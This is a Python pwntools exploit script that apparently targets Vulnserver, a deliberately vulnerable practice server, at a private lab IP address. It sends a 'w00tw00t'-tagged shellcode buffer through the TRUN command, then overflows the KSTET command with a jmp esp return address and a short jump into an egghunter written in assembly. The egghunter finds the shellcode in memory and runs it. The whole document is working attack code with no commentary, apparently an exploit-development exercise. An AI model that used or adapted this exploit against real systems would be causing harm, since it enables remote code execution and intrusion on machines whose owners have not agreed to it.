#!/usr/bin/env python3

from pwn import *

pad = b'\x41' * 66

# 0x625011af: jmp esp ;
ret = p32(0x625011af)

egghunter = asm('''
loop_inc_page:
    or dx, 0x0fff
loop_inc_one:
    inc edx
    push edx
    push 0x2
    pop eax
    int 0x2e
    cmp al, 0x5
    pop edx
    je loop_inc_page
    mov eax, 0x74303077
    mov edi, edx
    scasd
    jnz loop_inc_one
    scasd
    jnz loop_inc_one
    jmp edi
''')

buf =  b"w00tw00t"
buf += b"\xb8\x1c\x39\x42\xec\xd9\xec\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x52\x31\x42\x12\x83\xea\xfc\x03\x5e\x37\xa0"
buf += b"\x19\xa2\xaf\xa6\xe2\x5a\x30\xc7\x6b\xbf\x01\xc7\x08"
buf += b"\xb4\x32\xf7\x5b\x98\xbe\x7c\x09\x08\x34\xf0\x86\x3f"
buf += b"\xfd\xbf\xf0\x0e\xfe\xec\xc1\x11\x7c\xef\x15\xf1\xbd"
buf += b"\x20\x68\xf0\xfa\x5d\x81\xa0\x53\x29\x34\x54\xd7\x67"
buf += b"\x85\xdf\xab\x66\x8d\x3c\x7b\x88\xbc\x93\xf7\xd3\x1e"
buf += b"\x12\xdb\x6f\x17\x0c\x38\x55\xe1\xa7\x8a\x21\xf0\x61"
buf += b"\xc3\xca\x5f\x4c\xeb\x38\xa1\x89\xcc\xa2\xd4\xe3\x2e"
buf += b"\x5e\xef\x30\x4c\x84\x7a\xa2\xf6\x4f\xdc\x0e\x06\x83"
buf += b"\xbb\xc5\x04\x68\xcf\x81\x08\x6f\x1c\xba\x35\xe4\xa3"
buf += b"\x6c\xbc\xbe\x87\xa8\xe4\x65\xa9\xe9\x40\xcb\xd6\xe9"
buf += b"\x2a\xb4\x72\x62\xc6\xa1\x0e\x29\x8f\x06\x23\xd1\x4f"
buf += b"\x01\x34\xa2\x7d\x8e\xee\x2c\xce\x47\x29\xab\x31\x72"
buf += b"\x8d\x23\xcc\x7d\xee\x6a\x0b\x29\xbe\x04\xba\x52\x55"
buf += b"\xd4\x43\x87\xfa\x84\xeb\x78\xbb\x74\x4c\x29\x53\x9e"
buf += b"\x43\x16\x43\xa1\x89\x3f\xee\x58\x5a\x80\x47\x18\x7d"
buf += b"\x68\x9a\xdc\x90\x35\x13\x3a\xf8\xd5\x75\x95\x95\x4c"
buf += b"\xdc\x6d\x07\x90\xca\x08\x07\x1a\xf9\xed\xc6\xeb\x74"
buf += b"\xfd\xbf\x1b\xc3\x5f\x69\x23\xf9\xf7\xf5\xb6\x66\x07"
buf += b"\x73\xab\x30\x50\xd4\x1d\x49\x34\xc8\x04\xe3\x2a\x11"
buf += b"\xd0\xcc\xee\xce\x21\xd2\xef\x83\x1e\xf0\xff\x5d\x9e"
buf += b"\xbc\xab\x31\xc9\x6a\x05\xf4\xa3\xdc\xff\xae\x18\xb7"
buf += b"\x97\x37\x53\x08\xe1\x37\xbe\xfe\x0d\x89\x17\x47\x32"
buf += b"\x26\xf0\x4f\x4b\x5a\x60\xaf\x86\xde\x90\xfa\x8a\x77"
buf += b"\x39\xa3\x5f\xca\x24\x54\x8a\x09\x51\xd7\x3e\xf2\xa6"
buf += b"\xc7\x4b\xf7\xe3\x4f\xa0\x85\x7c\x3a\xc6\x3a\x7c\x6f"

pad = b'\x90' * 16 + egghunter + b'\x41' * (66 - 16 - len(egghunter))
payload = b'KSTET /.:/%s' % (pad + ret + b'\xe9\xbf\xff\xff\xff')

with remote('192.168.122.44', 9999) as r:
    r.writeline(b'TRUN %s' % buf)

with remote('192.168.122.44', 9999) as r:
    r.writeline(payload)

